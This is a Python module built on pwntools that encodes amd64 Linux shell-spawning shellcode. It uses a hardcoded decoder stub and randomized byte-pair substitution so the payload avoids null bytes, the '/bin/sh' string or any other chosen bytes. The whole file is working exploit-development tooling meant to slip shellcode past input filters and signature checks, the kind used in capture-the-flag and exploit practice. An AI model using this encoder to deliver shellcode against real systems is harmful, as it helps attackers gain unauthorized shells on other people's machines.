# -*- coding: utf-8 -*-

r"""
Flexible Shellcode Generation Tool

Removes specified bytes from shellcode generated from shellcraft. It's currently a standalone tool
but the intentions is to integrate it with shellcraft at some point. Example usage is as follows:

>>> payload = flexshell.nobinsh()
>>> payload
b'\xffH\x83\xc6\x1a\xfcH\xef\xbe\xad\xde\xff\xff\xef\xbe\xad\xde\\xbe\xba\xfe\xca'

Currently only 'amd64' architecture are supported
"""

from pwn import asm
from pwnlib import shellcraft
from random import choice
from random import randint
from pwnlib.context import LocalContext

import six
import collections
import random
import re
import string

@LocalContext
def _encode(raw_bytes, avoid=None, expr=None, force=0, pcreg=''):
    
    terminator = 0xac
    raw = b'H\x8d5\xf9\xff\xff\xffH\x83\xc6\x1a\xfcH\x89\xf7\xac\x93\xac(\xd8\xaa\x80\xeb\xacu\xf5'
        
    blacklist = set(raw)
    
    table = collections.defaultdict(lambda: [])
    endchar = bytearray()

    not_bad = lambda x: six.int2byte(x) not in avoid
    not_bad_or_term = lambda x: not_bad(x) and x != terminator

    for i in filter(not_bad_or_term, range(0, 256)):
        endchar.append(i)
        for j in filter(not_bad, range(0, 256)):
            table[(j - i) & 0xff].append(bytearray([i, j]))
    
    res = bytearray(raw)

    for c in bytearray(raw_bytes):
        l = len(table[c])
        if l == 0:
            print('No encodings for character %02x' % c)
            return None

        res += table[c][randint(0, l - 1)]

    res.append(terminator)
    res.append(choice(endchar))

    return bytes(res)

################################################################
# This just returns the original shellcraft shellcode
################################################################
def sh():
    return asm(shellcraft.amd64.linux.sh())

################################################################
# This extracts the /bin/sh string
################################################################
def nobinsh():
    avoid = b'/bin/sh\x00'
    return _encode(asm(shellcraft.sh()), avoid) 

################################################################
# This removes all null values in the shell code.
################################################################
def nonull(src):
    avoid = b'\x00'
    return _encode(asm(shellcraft.sh()), avoid)

################################################################
# This removes bytes in avoid from code.
################################################################
def flex(code, avoid):
    return _encode(code, avoid)